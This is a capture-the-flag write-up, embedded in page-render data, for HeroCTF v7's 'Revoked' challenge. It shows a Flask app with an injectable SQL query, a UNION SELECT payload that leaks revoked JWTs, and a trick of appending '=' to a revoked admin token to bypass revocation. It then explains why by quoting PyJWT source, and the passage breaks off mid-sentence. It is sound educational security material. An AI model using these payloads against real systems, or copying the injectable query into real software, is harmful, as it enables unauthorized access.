writeups\"}],[\"$\",\"$L2\",null,{\"parallelRouterKey\":\"children\",\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L3\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":\"$undefined\",\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]]]}],{\"children\":[[\"$\",\"$1\",\"c\",{\"children\":[\"$L5\",[[\"$\",\"script\",\"script-0\",{\"src\":\"/_next/static/chunks/03f4569ba78edab9.js\",\"async\":true,\"nonce\":\"$undefined\"}],[\"$\",\"script\",\"script-1\",{\"src\":\"/_next/static/chunks/44f6ea3170f4e31a.js\",\"async\":true,\"nonce\":\"$undefined\"}],[\"$\",\"script\",\"script-2\",{\"src\":\"/_next/static/chunks/39b99946d2be6a43.js\",\"async\":true,\"nonce\":\"$undefined\"}],[\"$\",\"script\",\"script-3\",{\"src\":\"/_next/static/chunks/116d3b69f07f8eb7.js\",\"async\":true,\"nonce\":\"$undefined\"}]],[\"$\",\"$L6\",null,{\"children\":[\"$\",\"$7\",null,{\"name\":\"Next.MetadataOutlet\",\"children\":\"$@8\"}]}]]}],{},null,false,false]},null,false,false]},null,false,false]},null,false,false],[\"$\",\"$1\",\"h\",{\"children\":[null,[\"$\",\"$L9\",null,{\"children\":\"$@a\"}],[\"$\",\"div\",null,{\"hidden\":true,\"children\":[\"$\",\"$Lb\",null,{\"children\":[\"$\",\"$7\",null,{\"name\":\"Next.Metadata\",\"children\":\"$@c\"}]}]}],[\"$\",\"meta\",null,{\"name\":\"next-size-adjust\",\"content\":\"\"}]]}],false]],\"m\":\"$undefined\",\"G\":[\"$d\",[]],\"S\":true}\n"])</script><script>self.__next_f.push([1,"a:[[\"$\",\"meta\",\"0\",{\"charSet\":\"utf-8\"}],[\"$\",\"meta\",\"1\",{\"name\":\"viewport\",\"content\":\"width=device-width, initial-scale=1\"}]]\n"])</script><script>self.__next_f.push([1,"e:I[10453,[\"/_next/static/chunks/44838f11011a9f2d.js\",\"/_next/static/chunks/03f4569ba78edab9.js\",\"/_next/static/chunks/44f6ea3170f4e31a.js\",\"/_next/static/chunks/39b99946d2be6a43.js\",\"/_next/static/chunks/116d3b69f07f8eb7.js\"],\"default\"]\nf:T1acd,"])</script><script>self.__next_f.push([1,"import os\nimport secrets\nimport sqlite3\nimport time\nfrom functools import wraps\n\nimport bcrypt\nimport jwt\nfrom dotenv import load_dotenv\nfrom flask import (\n    Flask,\n    flash,\n    jsonify,\n    make_response,\n    redirect,\n    render_template,\n    request,\n)\n\napp = Flask(__name__)\napp.static_folder = \"static\"\nload_dotenv()\napp.config[\"SECRET_KEY\"] = \"\".join(\n    [secrets.choice(\"abcdef0123456789\") for _ in range(32)]\n)\nFLAG = os.getenv(\"FLAG\")\n\n\ndef init_db():\n    conn = sqlite3.connect(\"database.db\")\n    cursor = conn.cursor()\n    cursor.execute(\"\"\"DROP TABLE IF EXISTS employees;\"\"\")\n    cursor.execute(\"\"\"DROP TABLE IF EXISTS revoked_tokens;\"\"\")\n    cursor.execute(\"\"\"DROP TABLE IF EXISTS users;\"\"\")\n    cursor.execute(\"\"\"CREATE TABLE IF NOT EXISTS users (\n                        id INTEGER PRIMARY KEY AUTOINCREMENT,\n                        username TEXT UNIQUE NOT NULL,\n                        is_admin BOOL NOT NULL,\n                        password_hash TEXT NOT NULL)\"\"\")\n    cursor.execute(\"\"\"CREATE TABLE IF NOT EXISTS revoked_tokens (\n                        id INTEGER PRIMARY KEY AUTOINCREMENT,\n                        token TEXT NOT NULL)\"\"\")\n    cursor.execute(\"\"\"CREATE TABLE IF NOT EXISTS employees (\n                        id INTEGER PRIMARY KEY AUTOINCREMENT,\n                        name TEXT NOT NULL,\n                        email TEXT UNIQUE NOT NULL,\n                        position TEXT NOT NULL,\n                        phone TEXT NOT NULL,\n                        location TEXT NOT NULL)\"\"\")\n    conn.commit()\n    conn.close()\n\n\ndef get_db_connection():\n    conn = sqlite3.connect(\"database.db\")\n    conn.row_factory = sqlite3.Row\n    return conn\n\n\ndef token_required(f):\n    @wraps(f)\n    def decorated(*args, **kwargs):\n        token = request.cookies.get(\"JWT\")\n        if not token:\n            flash(\"Token is missing!\", \"error\")\n            return redirect(\"/login\")\n\n        try:\n            data = jwt.decode(token, app.config[\"SECRET_KEY\"], algorithms=[\"HS256\"])\n            username = data[\"username\"]\n\n            conn = get_db_connection()\n            user = conn.execute(\n                \"SELECT id,is_admin FROM users WHERE username = ?\", (username,)\n            ).fetchone()\n            revoked = conn.execute(\n                \"SELECT id FROM revoked_tokens WHERE token = ?\", (token,)\n            ).fetchone()\n            conn.close()\n\n            if not user or revoked:\n                flash(\"Invalid or revoked token!\", \"error\")\n                return redirect(\"/login\")\n\n            request.is_admin = user[\"is_admin\"]\n            request.username = username\n\n        except jwt.InvalidTokenError:\n            flash(\"Invalid token!\", \"error\")\n            return redirect(\"/login\")\n\n        return f(*args, **kwargs)\n\n    return decorated\n\n\n@app.route(\"/\", methods=[\"GET\"])\ndef index():\n    token = request.cookies.get(\"JWT\", None)\n    if token is None:\n        return redirect(\"/login\")\n    else:\n        return redirect(\"/employees\")\n\n\n@app.route(\"/register\", methods=[\"GET\", \"POST\"])\ndef register():\n    if request.method == \"GET\":\n        return render_template(\"register.html\")\n    elif request.method == \"POST\":\n        data = request.form\n        username = data.get(\"username\")\n        password = data.get(\"password\")\n\n        if not username or not password:\n            return jsonify({\"message\": \"Username and password required!\"}), 400\n\n        password_hash = bcrypt.hashpw(\n            password.encode(\"utf-8\"), bcrypt.gensalt()\n        ).decode(\"utf-8\")\n\n        conn = get_db_connection()\n        try:\n            conn.execute(\n                \"INSERT INTO users (username, is_admin, password_hash) VALUES (?, ?, ?)\",\n                (username, False, password_hash),\n            )\n            conn.commit()\n        except sqlite3.IntegrityError:\n            flash(\"User already exists.\", \"error\")\n            return redirect(\"/register\")\n        finally:\n            conn.close()\n\n        flash(\"User created successfully.\", \"success\")\n        return redirect(\"/login\")\n\n\n@app.route(\"/login\", methods=[\"GET\", \"POST\"])\ndef login():\n    if request.method == \"GET\":\n        return render_template(\"login.html\")\n    elif request.method == \"POST\":\n        data = request.form\n        username = data.get(\"username\")\n        password = data.get(\"password\")\n\n        conn = get_db_connection()\n        user = conn.execute(\n            \"SELECT * FROM users WHERE username = ?\", (username,)\n        ).fetchone()\n        conn.close()\n\n        if user and bcrypt.checkpw(\n            password.encode(\"utf-8\"), user[\"password_hash\"].encode(\"utf-8\")\n        ):\n            token = jwt.encode(\n                {\n                    \"username\": username,\n                    \"is_admin\": user[\"is_admin\"],\n                    \"issued\": time.time(),\n                },\n                app.config[\"SECRET_KEY\"],\n                algorithm=\"HS256\",\n            )\n            resp = make_response(redirect(\"/employees\"))\n            resp.set_cookie(\"JWT\", token)\n            return resp\n\n        flash(\"Invalid credentials.\", \"error\")\n        return redirect(\"/login\")\n\n\n@app.route(\"/logout\", methods=[\"GET\"])\ndef logout():\n    token = request.cookies.get(\"JWT\")\n    if token:\n        conn = get_db_connection()\n        conn.execute(\"INSERT INTO revoked_tokens (token) VALUES (?)\", (token,))\n        conn.commit()\n        conn.close()\n    resp = make_response(redirect(\"/login\"))\n    resp.delete_cookie(\"JWT\")\n    return resp\n\n\n@app.route(\"/employees\", methods=[\"GET\"])\n@token_required\ndef employees():\n    query = request.args.get(\"query\", \"\")\n    conn = get_db_connection()\n    cursor = conn.cursor()\n    cursor.execute(\n        f\"SELECT id, name, email, position FROM employees WHERE name LIKE '%{query}%'\"\n    )\n    results = cursor.fetchall()\n    conn.close()\n    print(request.username)\n    return render_template(\"employees.html\", username=request.username, employees=results, query=query)\n\n\n@app.route(\"/employee/\u003cint:employee_id\u003e\", methods=[\"GET\"])\n@token_required\ndef employee_details(employee_id):\n    conn = get_db_connection()\n    employee = conn.execute(\n        \"SELECT * FROM employees WHERE id = ?\", (employee_id,)\n    ).fetchone()\n    conn.close()\n    print(employee)\n    if not employee:\n        flash(\"Employee not found\", \"error\")\n        return redirect(\"/employees\")\n    return render_template(\"employee_details.html\", username=request.username, employee=employee)\n\n\n@app.route(\"/admin\", methods=[\"GET\"])\n@token_required\ndef admin():\n    is_admin = getattr(request, \"is_admin\", None)\n    if is_admin:\n        return render_template(\"admin.html\", username=request.username, flag=FLAG)\n\n    flash(\"You don't have the permission to access this area\", \"error\")\n    return redirect(\"/employees\")\n\n\nif __name__ == \"__main__\":\n    init_db()\n    app.run(debug=False, host=\"0.0.0.0\", port=5000)"])</script><script>self.__next_f.push([1,"5:[\"$\",\"div\",null,{\"children\":[\"$\",\"main\",null,{\"className\":\"text-pretty max-w-5xl mx-auto text-sm [\u0026_h1]:text-5xl [\u0026_h1]:font-semibold [\u0026_h1]:mb-8 [\u0026_blockquote]:text-secondary [\u0026_blockquote]:space-y-3 [\u0026_blockquote]:border-l-4 [\u0026_blockquote]:border-secondary [\u0026_blockquote]:pl-5 [\u0026_blockquote]:mb-5 [\u0026\u003e_p]:my-4 [\u0026_img]:my-5 [\u0026_ul]:list-disc [\u0026_ul]:pl-6 [\u0026_ol]:list-decimal [\u0026_ol]:pl-6 [\u0026_img]:rounded [\u0026_li]:my-2\",\"children\":[[\"$\",\"h1\",\"h1-0\",{\"children\":\"HeroCTF v7 — Revoked (+ Revenge)\"}],\"\\n\",[\"$\",\"blockquote\",\"blockquote-0\",{\"children\":[\"\\n\",[\"$\",\"p\",\"p-0\",{\"children\":\"Your budget request for the new company personnel index has been declined. Instead, the intern has received a very small bonus in exchange for a homemade solution.\"}],\"\\n\",[\"$\",\"p\",\"p-1\",{\"children\":\"Show them their stinginess could cost them.\"}],\"\\n\"]}],\"\\n\",[\"$\",\"blockquote\",\"blockquote-1\",{\"children\":[\"\\n\",[\"$\",\"p\",\"p-0\",{\"children\":\"The chall maker forgot to remove a debug account... Here is the revenge challenge without this backdoor!\"}],\"\\n\"]}],\"\\n\",[\"$\",\"p\",\"p-0\",{\"children\":\"We're given a Python server that looks like this:\"}],\"\\n\",[\"$\",\"$Le\",\"pre-0\",{\"className\":\"my-2\",\"children\":\"$f\",\"language\":\"py\"}],\"\\n\",\"$L10\",\"\\n\",\"$L11\",\"\\n\",\"$L12\",\"\\n\",\"$L13\",\"\\n\",\"$L14\",\"\\n\",\"$L15\",\"\\n\",\"$L16\",\"\\n\",\"$L17\",\"\\n\",\"$L18\",\"\\n\",\"$L19\",\"\\n\",\"$L1a\",\"\\n\",\"$L1b\",\"\\n\",\"$L1c\",\"\\n\",\"$L1d\",\"\\n\",\"$L1e\",\"\\n\",\"$L1f\",\"\\n\",\"$L20\",\"\\n\",\"$L21\",\"\\n\",\"$L22\",\"\\n\",\"$L23\",\"\\n\",\"$L24\",\"\\n\",\"$L25\",\"\\n\",\"$L26\",\"\\n\",\"$L27\",\"\\n\",\"$L28\",\"\\n\",\"$L29\",\"\\n\",\"$L2a\",\"\\n\",\"$L2b\",\"\\n\",\"$L2c\",\"\\n\",\"$L2d\",\"\\n\",\"$L2e\",\"\\n\",\"$L2f\",\"\\n\",\"$L30\",\"\\n\",\"$L31\",\"\\n\",\"$L32\",\"\\n\",\"$L33\",\"\\n\",\"$L34\",\"\\n\",\"$L35\",\"\\n\",\"$L36\",\"\\n\",\"$L37\",\"\\n\",\"$L38\",\"\\n\",\"$L39\",\"\\n\",\"$L3a\",\"\\n\",\"$L3b\",\"\\n\",\"$L3c\",\"\\n\",\"$L3d\",\"\\n\",\"$L3e\",\"\\n\",\"$L3f\",\"\\n\",\"$L40\"]}]}]\n"])</script><script>self.__next_f.push([1,":HL[\"https://gist.github.com/user-attachments/assets/855a8a52-0b13-4e63-8bf5-7a538bbc906b\",\"image\"]\n:HL[\"https://gist.github.com/user-attachments/assets/b48b21e0-d52b-49da-b0e2-ac3588c59d54\",\"image\"]\n:HL[\"https://gist.github.com/user-attachments/assets/3e7424f6-d396-4778-9e7f-14b2a8c47c44\",\"image\"]\n:HL[\"https://gist.github.com/user-attachments/assets/d324b702-18b2-4f03-bfb6-e4fdc68b44fd\",\"image\"]\n:HL[\"https://gist.github.com/user-attachments/assets/6c273e82-c48c-495c-98f8-5882a2063fdb\",\"image\"]\n:HL[\"https://gist.github.com/user-attachments/assets/331cebcd-1238-432b-8142-e9998897b7ce\",\"image\"]\n:HL[\"https://gist.github.com/user-attachments/assets/c06783cc-f3c4-4b7a-a6f5-c3e93f25e449\",\"image\"]\n:HL[\"https://gist.github.com/user-attachments/assets/ac29cd97-1dd4-42ab-b135-fc945920cb99\",\"image\"]\n10:[\"$\",\"p\",\"p-1\",{\"children\":[\"We can see right off the bat that we have SQL injection in the \",[\"$\",\"code\",\"code-0\",{\"className\":\"font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]\",\"children\":\"/employees\"}],\" route:\"]}]\n11:[\"$\",\"$Le\",\"pre-1\",{\"className\":\"my-2\",\"children\":\"@app.route(\\\"/employees\\\", methods=[\\\"GET\\\"])\\n@token_required\\ndef employees():\\n    query = request.args.get(\\\"query\\\", \\\"\\\")\\n    conn = get_db_connection()\\n    cursor = conn.cursor()\\n    cursor.execute(\\n        f\\\"SELECT id, name, email, position FROM employees WHERE name LIKE '%{query}%'\\\"\\n    )\\n    results = cursor.fetchall()\\n    conn.close()\\n    print(request.username)\\n    return render_template(\\\"employees.html\\\", username=request.username, employees=results, query=query)\",\"language\":\"py\"}]\n12:[\"$\",\"p\",\"p-2\",{\"children\":[\"We can then use \",[\"$\",\"code\",\"code-0\",{\"className\":\"font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]\",\"children\":\"UNION SELECT\"}],\" to leak any part of their database. But what's this about revoked tokens?\"]}]\n13:[\"$\",\"p\",\"p-3\",{\"children\":[\"In their \",[\"$\",\"code\",\"code-0\",{\"className\":\"font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]\",\"children\":\"token_required\"}],\" decorator, we can see that our JWT is decoded and properties injected into the request object so long as:\"]}]\n14:[\"$\",\"ul\",\"ul-0\",{\"children\":[\"\\n\",[\"$\",\"li\",\"li-0\",{\"children\":\"The JWT is valid.\"}],\"\\n\",[\"$\",\"li\",\"li-1\",{\"children\":[\"The \",[\"$\",\"code\",\"code-0\",{\"className\":\"font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]\",\"children\":\"username\"}],\" corresponds to an existing user.\"]}],\"\\n\",[\"$\",\"li\",\"li-2\",{\"children\":[\"The token isn't in the \",[\"$\",\"code\",\"code-0\",{\"className\":\"font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]\",\"children\":\"revoked_tokens\"}],\" table.\"]}],\"\\n\"]}]\n41:T453,def token_required(f):\n    @wraps(f)\n    def decorated(*args, **kwargs):\n        token = request.cookies.get(\"JWT\")\n        if not token:\n            flash(\"Token is missing!\", \"error\")\n            return redirect(\"/login\")\n\n        try:\n            data = jwt.decode(token, app.config[\"SECRET_KEY\"], algorithms=[\"HS256\"])\n            username = data[\"username\"]\n\n            conn = get_db_connection()\n            user = conn.execute(\n                \"SELECT id,is_admin FROM users WHERE username = ?\", (username,)\n            ).fetchone()\n            revoked = conn.execute(\n                \"SELECT id FROM revoked_tokens WHERE token = ?\", (token,)\n            ).fetchone()\n            conn.close()\n\n            if not user or revoked:\n                flash(\"Invalid or revoked token!\", \"error\")\n                return redirect(\"/login\")\n\n            request.is_admin = user[\"is_admin\"]\n            request.username = username\n\n        except jwt.InvalidTokenError:\n            flash(\"Invalid token!\", \"error\")\n            return redirect(\"/login\")\n\n        return f(*args, **kwargs)\n\n    return decorated15:[\"$\",\"$Le\",\"pre-2\",{\"className\":\"my-2\",\"children\":\"$41\",\"language\":\"py\"}]\n16:[\"$\",\"p\",\"p-4\",{\"children\":[\"So the main idea is this: we can leak the \",[\"$\",\"code\",\"code-0\",{\"className\":\"font-jetbrains opacity"])</script><script>self.__next_f.push([1,"-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]\",\"children\":\"revoked_tokens\"}],\" table and (assumedly) find an admin token there. If we can slightly perturb this token such that it is no longer exactly the same token as before (but the token still decodes correctly), we can become admin and win!\"]}]\n17:[\"$\",\"$Le\",\"pre-3\",{\"className\":\"my-2\",\"children\":\"@app.route(\\\"/admin\\\", methods=[\\\"GET\\\"])\\n@token_required\\ndef admin():\\n    is_admin = getattr(request, \\\"is_admin\\\", None)\\n    if is_admin:\\n        return render_template(\\\"admin.html\\\", username=request.username, flag=FLAG)\\n\\n    flash(\\\"You don't have the permission to access this area\\\", \\\"error\\\")\\n    return redirect(\\\"/employees\\\")\",\"language\":\"py\"}]\n18:[\"$\",\"p\",\"p-5\",{\"children\":[\"We can use our simple SQL injection to leak the \",[\"$\",\"code\",\"code-0\",{\"className\":\"font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]\",\"children\":\"revoked_tokens\"}],\" table,\"]}]\n19:[\"$\",\"p\",\"p-6\",{\"children\":[\"$\",\"img\",\"img-0\",{\"src\":\"https://gist.github.com/user-attachments/assets/855a8a52-0b13-4e63-8bf5-7a538bbc906b\",\"alt\":\"image\"}]}]\n1a:[\"$\",\"$Le\",\"pre-4\",{\"className\":\"my-2\",\"children\":\"a%'UNION SELECT id,token,token,token FROM revoked_tokens;--\",\"language\":\"sql\"}]\n1b:[\"$\",\"p\",\"p-7\",{\"children\":\"and just check tokens until we find one corresponding to an admin (in this case,\"}]\n1c:[\"$\",\"$Le\",\"pre-5\",{\"className\":\"my-2\",\"children\":\"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaXNfYWRtaW4iOjEsImlzc3VlZCI6MTc2NDY0NjgzOC4zODE5NzgzfQ.5xEmNRYdgbWg77FWf3kPs28Ulcsqm_JimpCYymoCCCk\",\"language\":\"$undefined\"}]\n1d:[\"$\",\"p\",\"p-8\",{\"children\":[\"$\",\"img\",\"img-0\",{\"src\":\"https://gist.github.com/user-attachments/assets/b48b21e0-d52b-49da-b0e2-ac3588c59d54\",\"alt\":\"image\"}]}]\n1e:[\"$\",\"p\",\"p-9\",{\"children\":[\"So how do we change this slightly to bypass the \",[\"$\",\"code\",\"code-0\",{\"className\":\"font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]\",\"children\":\"revoked_tokens\"}],\" check? What if we simply add an \",[\"$\",\"code\",\"code-1\",{\"className\":\"font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]\",\"children\":\"=\"}],\" to the end of it? (after all, \",[\"$\",\"code\",\"code-2\",{\"className\":\"font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]\",\"children\":\"=\"}],\" is a padding character in base64 each part of the JWT is base64 encoded, right?)\"]}]\n1f:[\"$\",\"p\",\"p-10\",{\"children\":\"Setting our JWT cookie to\"}]\n20:[\"$\",\"$Le\",\"pre-6\",{\"className\":\"my-2\",\"children\":\"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaXNfYWRtaW4iOjEsImlzc3VlZCI6MTc2NDY0NjgzOC4zODE5NzgzfQ.5xEmNRYdgbWg77FWf3kPs28Ulcsqm_JimpCYymoCCCk=\",\"language\":\"$undefined\"}]\n21:[\"$\",\"p\",\"p-11\",{\"children\":\"we get the flag:\"}]\n22:[\"$\",\"p\",\"p-12\",{\"children\":[\"$\",\"img\",\"img-0\",{\"src\":\"https://gist.github.com/user-attachments/assets/3e7424f6-d396-4778-9e7f-14b2a8c47c44\",\"alt\":\"image\"}]}]\n23:[\"$\",\"p\",\"p-13\",{\"children\":[\"$\",\"img\",\"img-0\",{\"src\":\"https://gist.github.com/user-attachments/assets/d324b702-18b2-4f03-bfb6-e4fdc68b44fd\",\"alt\":\"image\"}]}]\n24:[\"$\",\"p\",\"p-14\",{\"children\":[\"(this same solve works on both \",[\"$\",\"code\",\"code-0\",{\"className\":\"font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]\",\"children\":\"Revoked\"}],\" and \",[\"$\",\"code\",\"code-1\",{\"className\":\"font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]\",\"children\":\"Revoked Revenge\"}],\", as we didn't rely on any shenanigans with any \\\"debug accounts\\\").\"]}]\n25:[\"$\",\"div\",\"h3-0\",{\"className\":\"relative\",\"children\":[[\"$\",\"span\",null,{\"id\":\"but-wait-a-second...\",\"className\":\"absolute -top-16\"}],[\"$\",\"a\",null,{\"className\":\"group flex gap-2 items-center text-inherit hover:underline decoration-1 underline-offset-4 decoration-secondary decoration-dotted text-3xl font-bold mt-10 mb-4 \",\"href\":\"#but-wait-a-second...\",\"children\":[[\"$\",\"h2\",null,{\"children\":\"But wait a second...\"}],[\"$\",\"svg\",null,{\"stroke\":\"currentColor\",\"fill\":\"none\",\"strokeWi"])</script><script>self.__next_f.push([1,"dth\":\"2\",\"viewBox\":\"0 0 24 24\",\"strokeLinecap\":\"round\",\"strokeLinejoin\":\"round\",\"className\":\"hidden group-hover:block text-xl absolute pt-0.5 -left-7 stroke-[1.5px] text-secondary\",\"children\":[\"$undefined\",[[\"$\",\"path\",\"0\",{\"d\":\"M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71\",\"children\":[]}],[\"$\",\"path\",\"1\",{\"d\":\"M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71\",\"children\":[]}]]],\"style\":{\"color\":\"$undefined\"},\"height\":\"1em\",\"width\":\"1em\",\"xmlns\":\"http://www.w3.org/2000/svg\"}]]}]]}]\n26:[\"$\",\"p\",\"p-15\",{\"children\":[\"Why does this payload actually work? Indeed, if we tried to add an \",[\"$\",\"code\",\"code-0\",{\"className\":\"font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]\",\"children\":\"=\"}],\" to the JWT on \",[\"$\",\"code\",\"code-1\",{\"className\":\"font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]\",\"children\":\"jwt.io\"}],\", we'd get the following error message:\"]}]\n27:[\"$\",\"p\",\"p-16\",{\"children\":[\"$\",\"img\",\"img-0\",{\"src\":\"https://gist.github.com/user-attachments/assets/6c273e82-c48c-495c-98f8-5882a2063fdb\",\"alt\":\"image\"}]}]\n28:[\"$\",\"p\",\"p-17\",{\"children\":[\"The caveat is this: JWT segments aren't base64 encoded, they are \",[\"$\",\"em\",\"em-0\",{\"children\":\"base64url\"}],\" encoded. And seemingly from reading the \",[\"$\",\"a\",\"a-0\",{\"href\":\"https://developer.mozilla.org/en-US/docs/Glossary/Base64#url_and_filename_safe_base64\",\"children\":\"MDN documentation\"}],\",\"]}]\n29:[\"$\",\"blockquote\",\"blockquote-2\",{\"children\":[\"\\n\",[\"$\",\"p\",\"p-0\",{\"children\":[\"A common variant of this definition allows only characters that are safe to use in filenames and URL values. This version, defined in RFC 4648, section 5, omits the padding and replaces \",[\"$\",\"code\",\"code-0\",{\"className\":\"font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]\",\"children\":\"+\"}],\" and \",[\"$\",\"code\",\"code-1\",{\"className\":\"font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]\",\"children\":\"/\"}],\" with \",[\"$\",\"code\",\"code-2\",{\"className\":\"font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]\",\"children\":\"-\"}],\" and \",[\"$\",\"code\",\"code-3\",{\"className\":\"font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]\",\"children\":\"_\"}],\".\"]}],\"\\n\"]}]\n2a:[\"$\",\"p\",\"p-18\",{\"children\":[\"So if \",[\"$\",\"code\",\"code-0\",{\"className\":\"font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]\",\"children\":\"base64url\"}],\" omits the padding \",[\"$\",\"code\",\"code-1\",{\"className\":\"font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]\",\"children\":\"=\"}],\" characters, why did Python's \",[\"$\",\"code\",\"code-2\",{\"className\":\"font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]\",\"children\":\"jwt\"}],\" decode it anyways? I decided to read the \",[\"$\",\"a\",\"a-0\",{\"href\":\"https://github.com/jpadilla/pyjwt/tree/master\",\"children\":\"PyJWT source\"}],\" to find out:\"]}]\n42:T5ac,"])</script><script>self.__next_f.push([1,"    def decode(\n        self,\n        jwt: str | bytes,\n        key: AllowedPublicKeys | PyJWK | str | bytes = \"\",\n        algorithms: Sequence[str] | None = None,\n        options: Options | None = None,\n        # deprecated arg, remove in pyjwt3\n        verify: bool | None = None,\n        # could be used as passthrough to api_jws, consider removal in pyjwt3\n        detached_payload: bytes | None = None,\n        # passthrough arguments to _validate_claims\n        # consider putting in options\n        audience: str | Iterable[str] | None = None,\n        subject: str | None = None,\n        issuer: str | Container[str] | None = None,\n        leeway: float | timedelta = 0,\n        # kwargs\n        **kwargs: Any,\n    ) -\u003e dict[str, Any]:\n        \"\"\"\n        ...\n        \"\"\"\n        if kwargs:\n            warnings.warn(\n                \"passing additional kwargs to decode() is deprecated \"\n                \"and will be removed in pyjwt version 3. \"\n                f\"Unsupported kwargs: {tuple(kwargs.keys())}\",\n                RemovedInPyjwt3Warning,\n                stacklevel=2,\n            )\n        decoded = self.decode_complete(\n            jwt,\n            key,\n            algorithms,\n            options,\n            verify=verify,\n            detached_payload=detached_payload,\n            audience=audience,\n            subject=subject,\n            issuer=issuer,\n            leeway=leeway,\n        )\n        return decoded[\"payload\"]"])</script><script>self.__next_f.push([1,"2b:[\"$\",\"$Le\",\"pre-7\",{\"className\":\"my-2\",\"children\":\"$42\",\"language\":\"py\"}]\n2c:[\"$\",\"p\",\"p-19\",{\"children\":[\"Seemingly, \",[\"$\",\"a\",\"a-0\",{\"href\":\"https://github.com/jpadilla/pyjwt/blob/master/jwt/api_jwt.py#L286\",\"children\":[\"$\",\"code\",\"code-0\",{\"className\":\"font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]\",\"children\":\"decode(...)\"}]}],\" just calls \",[\"$\",\"a\",\"a-1\",{\"href\":\"https://github.com/jpadilla/pyjwt/blob/master/jwt/api_jwt.py#L163\",\"children\":[\"$\",\"code\",\"code-0\",{\"className\":\"font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]\",\"children\":\"decode_complete(...)\"}]}],\":\"]}]\n43:Ta09,"])</script><script>self.__next_f.push([1,"    def decode_complete(\n        self,\n        jwt: str | bytes,\n        key: AllowedPublicKeyTypes = \"\",\n        algorithms: Sequence[str] | None = None,\n        options: Options | None = None,\n        # deprecated arg, remove in pyjwt3\n        verify: bool | None = None,\n        # could be used as passthrough to api_jws, consider removal in pyjwt3\n        detached_payload: bytes | None = None,\n        # passthrough arguments to _validate_claims\n        # consider putting in options\n        audience: str | Iterable[str] | None = None,\n        issuer: str | Container[str] | None = None,\n        subject: str | None = None,\n        leeway: float | timedelta = 0,\n        # kwargs\n        **kwargs: Any,\n    ) -\u003e dict[str, Any]:\n        \"\"\"\n        ...\n        \"\"\"\n        if kwargs:\n            warnings.warn(\n                \"passing additional kwargs to decode_complete() is deprecated \"\n                \"and will be removed in pyjwt version 3. \"\n                f\"Unsupported kwargs: {tuple(kwargs.keys())}\",\n                RemovedInPyjwt3Warning,\n                stacklevel=2,\n            )\n\n        if options is None:\n            verify_signature = True\n        else:\n            verify_signature = options.get(\"verify_signature\", True)\n\n        # If the user has set the legacy `verify` argument, and it doesn't match\n        # what the relevant `options` entry for the argument is, inform the user\n        # that they're likely making a mistake.\n        if verify is not None and verify != verify_signature:\n            warnings.warn(\n                \"The `verify` argument to `decode` does nothing in PyJWT 2.0 and newer. \"\n                \"The equivalent is setting `verify_signature` to False in the `options` dictionary. \"\n                \"This invocation has a mismatch between the kwarg and the option entry.\",\n                category=DeprecationWarning,\n                stacklevel=2,\n            )\n\n        sig_options: SigOptions = {\"verify_signature\": verify_signature}\n        decoded = api_jws.decode_complete(\n            jwt,\n            key=key,\n            algorithms=algorithms,\n            options=sig_options,\n            detached_payload=detached_payload,\n        )\n\n        payload = self._decode_payload(decoded)\n\n        merged_options = self._merge_options(options)\n        self._validate_claims(\n            payload,\n            merged_options,\n            audience=audience,\n            issuer=issuer,\n            leeway=leeway,\n            subject=subject,\n        )\n\n        decoded[\"payload\"] = payload\n        return decoded"])</script><script>self.__next_f.push([1,"2d:[\"$\",\"$Le\",\"pre-8\",{\"className\":\"my-2\",\"children\":\"$43\",\"language\":\"py\"}]\n2e:[\"$\",\"p\",\"p-20\",{\"children\":[\"and in \",[\"$\",\"code\",\"code-0\",{\"className\":\"font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]\",\"children\":\"decode_complete()\"}],\", the decoding of the JWT string is handled by 